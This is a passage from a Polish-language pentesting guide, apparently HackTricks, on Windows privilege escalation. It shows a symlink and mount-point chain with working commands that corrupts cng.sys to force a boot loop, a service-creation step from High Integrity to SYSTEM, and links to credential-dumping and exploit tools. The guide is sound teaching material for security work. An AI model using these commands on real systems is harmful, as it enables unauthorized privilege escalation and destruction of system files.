- Konfiguracja przechowująca ścieżkę docelową musi być zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i dowiązania symbolicznego pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić lokalizację uprzywilejowanego logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator uruchomi „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić uszkodzenie; ponowne uruchomienie wymusi załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **boot loop DoS**. Tę metodę można też zastosować do dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać podjęta próba załadowania jej w pierwszej kolejności, co czyni z niej niezawodny cel DoS dla uszkodzonych danych.



## **Od High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli już działasz w procesie High Integrity, **ścieżka do SYSTEM** może być łatwa — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia binarnego pliku usługi upewnij się, że jest on prawidłową usługą albo że wykonuje niezbędne działania wystarczająco szybko, ponieważ zostanie zakończony po 20 s, jeśli nie będzie prawidłową usługą.

### AlwaysInstallElevated

Z procesu High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu wrappera _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru oraz o instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kod znajdziesz** [**tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie High Integrity), możesz **otworzyć prawie dowolny proces** (z wyjątkiem procesów chronionych) dzięki uprawnieniu SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
W tej technice zazwyczaj **wybiera się dowolny proces działający jako SYSTEM z wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj to**](#named-pipe-client-impersonation).\
Jeśli chcesz zobaczyć przykład [**przejścia z High Integrity do System przy użyciu name pipes, przeczytaj to**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll** **ładowaną** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny do tego rodzaju eskalacji uprawnień. Co więcej, **znacznie łatwiej przeprowadzić go z procesu High Integrity**, ponieważ będzie on mieć **uprawnienia zapisu** do folderów używanych do ładowania dll.\
**Więcej o Dll Hijacking dowiesz się** [**tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i poufne pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywane.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje potencjalne błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj lokalnie opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykrywane.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (DEPRECATED, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (należy skompilować przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta pod kątem błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (precompiled executable na github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje potencjalne błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny skrypt Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekt należy skompilować przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić wersję .NET zainstalowaną na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Podnoszenie uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty z lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: phishing z makrem Word VBA przez SMTP → odszyfrowanie danych logowania hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak przez format string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików z podwyższonymi uprawnieniami w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania symbolic links — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Wykorzystywanie symbolic links w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie warunków wyścigu CLDFLT i DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: prymityw pełnego odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Wykorzystywanie dowolnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka umożliwiająca lokalną eskalację uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Menedżera poświadczeń i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — Delegowanie ograniczone oparte na zasobach Kerberos: zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie firmowych serwerów aktualizacji w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie firmowych serwerów aktualizacji w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtworzenie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — luka w usłudze Windows MIDI: eskalacja uprawnień przez przesunięcia w pamięci współdzielonej](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
